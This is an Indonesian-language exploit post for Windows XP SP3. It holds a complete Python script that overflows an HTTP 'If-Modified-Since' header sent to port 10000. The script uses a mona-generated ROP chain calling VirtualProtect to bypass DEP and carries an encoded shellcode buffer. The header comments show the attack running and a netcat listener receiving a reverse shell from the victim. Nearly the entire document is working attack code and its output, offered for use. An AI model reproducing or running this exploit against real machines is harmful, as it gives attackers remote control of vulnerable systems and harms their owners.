#Title: Exploitasi Windows XP SP3 dengan Bypass DEP
#Tanggal : 1 November 2020
#Author : ktrnxx
#
# 1. Menjalankan eksploit
#
#┌─[ktrnxx@parrot]─[~/Unduhan/winapp2]
#└──╼ $python exploit2.py
#[!] Connected
#[+] Mengirim data
#
# 2. Membuka port nc
#
#┌─[✗]─[ktrnxx@parrot]─[~]
#└──╼ $nc -lvp 4444
#listening on [any] 4444 ...
#connect to [192.168.43.227] from unknown-6eb5c90 [192.168.43.21] 1381
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\Admin\Desktop>systeminfo
#systeminfo
#
#Host Name:                 UNKNOWN-6EB5C90
#OS Name:                   Microsoft Windows XP Professional
#OS Version:                5.1.2600 Service Pack 3 Build 2600
#
# 3. Exploit code dibawah
#

#!/usr/bin/python

import socket
import struct
import os
import sys

target = "192.168.43.21"

buf =  ""
buf += "\xd9\xc3\xbf\xc6\x3e\x1e\xa3\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x52\x31\x7a\x17\x83\xea\xfc\x03\xbc\x2d\xfc"
buf += "\x56\xbc\xba\x82\x99\x3c\x3b\xe3\x10\xd9\x0a\x23\x46"
buf += "\xaa\x3d\x93\x0c\xfe\xb1\x58\x40\xea\x42\x2c\x4d\x1d"
buf += "\xe2\x9b\xab\x10\xf3\xb0\x88\x33\x77\xcb\xdc\x93\x46"
buf += "\x04\x11\xd2\x8f\x79\xd8\x86\x58\xf5\x4f\x36\xec\x43"
buf += "\x4c\xbd\xbe\x42\xd4\x22\x76\x64\xf5\xf5\x0c\x3f\xd5"
buf += "\xf4\xc1\x4b\x5c\xee\x06\x71\x16\x85\xfd\x0d\xa9\x4f"
buf += "\xcc\xee\x06\xae\xe0\x1c\x56\xf7\xc7\xfe\x2d\x01\x34"
buf += "\x82\x35\xd6\x46\x58\xb3\xcc\xe1\x2b\x63\x28\x13\xff"
buf += "\xf2\xbb\x1f\xb4\x71\xe3\x03\x4b\x55\x98\x38\xc0\x58"
buf += "\x4e\xc9\x92\x7e\x4a\x91\x41\x1e\xcb\x7f\x27\x1f\x0b"
buf += "\x20\x98\x85\x40\xcd\xcd\xb7\x0b\x9a\x22\xfa\xb3\x5a"
buf += "\x2d\x8d\xc0\x68\xf2\x25\x4e\xc1\x7b\xe0\x89\x26\x56"
buf += "\x54\x05\xd9\x59\xa5\x0c\x1e\x0d\xf5\x26\xb7\x2e\x9e"
buf += "\xb6\x38\xfb\x31\xe6\x96\x54\xf2\x56\x57\x05\x9a\xbc"
buf += "\x58\x7a\xba\xbf\xb2\x13\x51\x3a\x55\xdc\x0e\x6f\x46"
buf += "\xb4\x4c\x6f\x99\x19\xd8\x89\xf3\xb1\x8c\x02\x6c\x2b"
buf += "\x95\xd8\x0d\xb4\x03\xa5\x0e\x3e\xa0\x5a\xc0\xb7\xcd"
buf += "\x48\xb5\x37\x98\x32\x10\x47\x36\x5a\xfe\xda\xdd\x9a"
buf += "\x89\xc6\x49\xcd\xde\x39\x80\x9b\xf2\x60\x3a\xb9\x0e"
buf += "\xf4\x05\x79\xd5\xc5\x88\x80\x98\x72\xaf\x92\x64\x7a"
buf += "\xeb\xc6\x38\x2d\xa5\xb0\xfe\x87\x07\x6a\xa9\x74\xce"
buf += "\xfa\x2c\xb7\xd1\x7c\x31\x92\xa7\x60\x80\x4b\xfe\x9f"
buf += "\x2d\x1c\xf6\xd8\x53\xbc\xf9\x33\xd0\xdc\x1b\x91\x2d"
buf += "\x75\x82\x70\x8c\x18\x35\xaf\xd3\x24\xb6\x45\xac\xd2"
buf += "\xa6\x2c\xa9\x9f\x60\xdd\xc3\xb0\x04\xe1\x70\xb0\x0c"

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x77c52217,  # POP EAX # RETN [msvcrt.dll] 
        0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
        0x77e82d54,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
        0x77ee188f,  # PUSH EAX # DEC EAX # POP ESI # RETN 0x04 [RPCRT4.dll] 
        #[---INFO:gadgets_to_set_ebp:---]
        0x77c4c286,  # POP EBP # RETN [msvcrt.dll] 
        0x41414141,  # Filler (RETN offset compensation)
        0x77def0d2,  # & call esp [ADVAPI32.dll]
        #[---INFO:gadgets_to_set_ebx:---]
        0x77c4ded4,  # POP EAX # RETN [msvcrt.dll] 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x77e8b574,  # NEG EAX # RETN [RPCRT4.dll] 
        0x77df563a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] 
        #[---INFO:gadgets_to_set_edx:---]
        0x77eee9f7,  # POP EAX # RETN [RPCRT4.dll] 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x77e90174,  # NEG EAX # RETN [RPCRT4.dll] 
        0x77e2c3f8,  # XCHG EAX,EDX # RETN [ADVAPI32.dll] 
        #[---INFO:gadgets_to_set_ecx:---]
        0x77c421f0,  # POP ECX # RETN [msvcrt.dll] 
        0x77efc78c,  # &Writable location [RPCRT4.dll]
        #[---INFO:gadgets_to_set_edi:---]
        0x77c3048a,  # POP EDI # RETN [msvcrt.dll] 
        0x77e90176,  # RETN (ROP NOP) [RPCRT4.dll]
        #[---INFO:gadgets_to_set_eax:---]
        0x77c34de1,  # POP EAX # RETN [msvcrt.dll] 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x77e9ee82,  # PUSHAD # RETN [RPCRT4.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

data = "A"*205 + rop_chain + "\x90"*16 + buf + "C"*(5000-205-len(rop_chain)-16-len(buf))

header = (
'GET / HTTP/1.1\r\n'
'Host: %s\r\n'
'If-Modified-Since: pwned, %s\r\n'
'\r\n') % (target, data)

konek = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    konek.connect((target,10000))
    print "[!] Connected"
except:
    print "[!] Gagal Konek"
    sys.exit(0)
print "[+] mengirim data"
konek.send(header)
konek.close
